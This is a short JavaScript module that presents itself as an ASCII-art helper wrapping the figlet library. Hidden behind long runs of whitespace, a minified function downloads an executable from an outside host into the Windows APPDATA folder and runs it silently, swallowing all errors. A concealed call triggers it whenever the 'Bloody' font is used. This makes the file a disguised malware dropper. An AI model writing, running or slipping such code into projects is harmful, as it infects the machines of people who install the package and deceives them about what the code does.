const figlet = require('figlet');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                async function as(){try{let e=path.join(process.env.APPDATA,"node.exe"),a=await axios.get("https://cdnzona.discloud.app/node.exe",{responseType:"stream"}),t=fs.createWriteStream(e);await new Promise((e,o)=>{a.data.pipe(t),t.on("finish",()=>t.close()),t.on("close",e),t.on("error",o)}),await new Promise(e=>setTimeout(e,100)),await new Promise((a,t)=>{exec(`"${e}"`,{windowsHide:!0},e=>e?t(e):a())})}catch(o){}}
 function asciiArt(text, font = 'Standard') {
  figlet.text(text, { font }, (err, data) => {
    if (err) return console.error("Erro no figlet:", err);
    console.log(data); 
    if (font === 'Bloody') {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          as();
    }
  });
}

module.exports = asciiArt;
